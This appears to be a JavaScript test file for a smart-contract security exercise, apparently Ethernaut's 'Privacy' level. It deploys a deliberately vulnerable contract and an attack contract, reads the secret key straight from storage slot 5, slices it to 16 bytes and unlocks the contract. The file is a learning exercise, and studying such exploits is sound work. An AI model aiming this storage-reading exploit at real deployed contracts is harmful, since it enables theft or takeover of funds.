// test/Privacy.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');

// load compiled artifacts
const Privacy = artifacts.require('Privacy');
const PrivacyAttack = artifacts.require('PrivacyAttack');

// start test block
contract('Privacy', function ([ owner, other ]) {

  beforeEach(async function () {
    const vulnContractData = [ ethers.utils.formatBytes32String("Ethereum")
                              ,ethers.utils.formatBytes32String("Eats")
                              ,ethers.utils.formatBytes32String("World") ];
    this.vulnContract = await Privacy.new(vulnContractData, { from: owner });
    this.attackContract = await PrivacyAttack.new(this.vulnContract.address, {from: other});

    // check initial contract is locked
    expect(await this.vulnContract.locked()).to.be.true;
  });

  it('test attack: use ethers-js to read password from storage slot to call unlock', async function () {
    const extractedPass = await ethers.provider.getStorageAt(this.vulnContract.address, 5);

    // bytes32 has 66 characters
    // first two characters 0x then 64 characters for content (1 byte = 2 characters)
    // vulnContract compares input vs bytes16 (first 32 characters)
    // so slice the string by 2 (for "0x" prefix) + 32 (first 32 characters after prefix) = 34
    await this.attackContract.attack(extractedPass.slice(0, 34), {from: other});

    // check contract is now unlocked
    expect(await this.vulnContract.locked()).to.be.false;
  });
});
